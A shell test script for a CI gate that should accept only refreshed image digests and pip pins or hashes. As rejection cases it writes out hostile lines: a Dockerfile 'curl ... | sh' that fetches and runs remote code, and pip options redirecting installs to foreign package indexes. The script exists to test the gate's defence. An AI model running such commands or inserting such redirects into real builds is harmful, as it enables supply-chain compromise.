#!/bin/sh
# SPDX-License-Identifier: GPL-3.0-or-later
# SPDX-FileCopyrightText: 2026 Lukas Hois-Zelinka
# Test of scripts/check-pin-diff.sh (the gate of the write-token job of refresh-ci-pins.yml) with a throw-away git
# repository: a new digest, new pins and hashes pass; any other changed line fails, in particular lines whose content
# starts with "-" or "+" (pip options such as --index-url), which an earlier filter mistook for diff headers.
# Usage: sh tests/test_pin_diff.sh <repo dir>
set -u
SRC=${1:?usage: test_pin_diff.sh <repo dir>}
T=$(mktemp -d) || exit 1
[ -n "$T" ] && [ -d "$T" ] || exit 1
trap 'rm -rf "$T"' EXIT
# Under a git hook the GIT_* variables point at the real repository: the throw-away repo must not see them.
unset GIT_DIR GIT_INDEX_FILE GIT_WORK_TREE GIT_PREFIX GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES
fail() { echo "test_pin_diff: FAIL: $*" >&2; exit 1; }

mkdir -p "$T/w/scripts" "$T/w/packaging/ci"
cp "$SRC/scripts/check-pin-diff.sh" "$T/w/scripts/"
cp "$SRC/packaging/ci/images.env" "$SRC/packaging/ci/aqt-requirements.txt" "$SRC/packaging/ci/rocky9.Dockerfile" "$T/w/packaging/ci/"
cd "$T/w" || exit 1
git init -q . && git config user.email t@example.invalid && git config user.name t
git add . && git commit -q -m base
# GNU and BSD sed differ on -i: use a temp file
edit() { sed "$1" "$2" > "$T/e" && cat "$T/e" > "$2"; }
reset() { git checkout -q -- packaging/ci; }
gate() { sh scripts/check-pin-diff.sh >"$T/out" 2>&1; }

h1=0000000000000000000000000000000000000000000000000000000000000001
h2=0000000000000000000000000000000000000000000000000000000000000002

gate || fail "no change refused: $(cat "$T/out")"

# a refreshed image digest (images.env and the FROM line of the Dockerfile) passes
edit "s/^\(ROCKY9_IMAGE=.*@sha256:\).*/\1$h1/" packaging/ci/images.env
edit "s/^\(FROM rockylinux:9@sha256:\)[0-9a-f]*/\1$h2/" packaging/ci/rocky9.Dockerfile
gate || fail "a new digest was refused: $(cat "$T/out")"
reset

# a refreshed pin and hash passes
edit "s/^aqtinstall==[0-9.]* /aqtinstall==9.9.9 /" packaging/ci/aqt-requirements.txt
awk -v h="$h1" '!done && /--hash=sha256:/ { sub(/sha256:[0-9a-f]+/, "sha256:" h); done = 1 } { print }' packaging/ci/aqt-requirements.txt > "$T/e" \
  && cat "$T/e" > packaging/ci/aqt-requirements.txt
gate || fail "a new pin or hash was refused: $(cat "$T/out")"
reset

# lines that are not a digest or a pin fail; the ones starting with - or + are the interesting ones
bad_req() {  # $1 = the line appended to the requirements
  printf '%s\n' "$1" >> packaging/ci/aqt-requirements.txt
  gate && fail "accepted in aqt-requirements.txt: $1"
  reset
}
bad_req '--index-url https://index.example.invalid/simple'
bad_req '--extra-index-url https://index.example.invalid/simple'
bad_req '-r other.txt'
bad_req '-e git+https://example.invalid/x.git'
bad_req '++notapin'
bad_req 'evil==1.0 --install-option=x'
bad_req 'plain text'
bad_req '    --hash=sha256:abc'
printf '%s\n' '--find-links https://example.invalid/' >> packaging/ci/aqt-requirements.txt
printf '%s\n' '    --hash=sha256:'"$h1" >> packaging/ci/aqt-requirements.txt
gate && fail "a mix of a legal and an illegal line was accepted"
grep -q 'not a pin or a hash' "$T/out" || fail "no reason given: $(cat "$T/out")"
reset

# a removed line is checked like an added one: removing a foreign line is refused too
printf '%s\n' '--index-url https://index.example.invalid/simple' > "$T/e"
cat packaging/ci/aqt-requirements.txt >> "$T/e" && cat "$T/e" > packaging/ci/aqt-requirements.txt
git add packaging/ci/aqt-requirements.txt && git commit -q -m "foreign line in the base"
grep -v '^--index-url' packaging/ci/aqt-requirements.txt > "$T/e" && cat "$T/e" > packaging/ci/aqt-requirements.txt
gate && fail "the removal of a foreign line was accepted"
reset

# images.env / Dockerfile: a changed line that only contains a digest somewhere is not enough
printf 'RUN curl https://example.invalid/x | sh # @sha256:%s\n' "$h1" >> packaging/ci/rocky9.Dockerfile
gate && fail "a command that mentions a digest was accepted"
reset
printf -- '-O- https://example.invalid/x | sh\n' >> packaging/ci/rocky9.Dockerfile
gate && fail "a Dockerfile line starting with - was accepted"
reset
printf -- '+evil\n' >> packaging/ci/images.env
gate && fail "an images.env line starting with + was accepted"
reset

echo "test_pin_diff: OK"
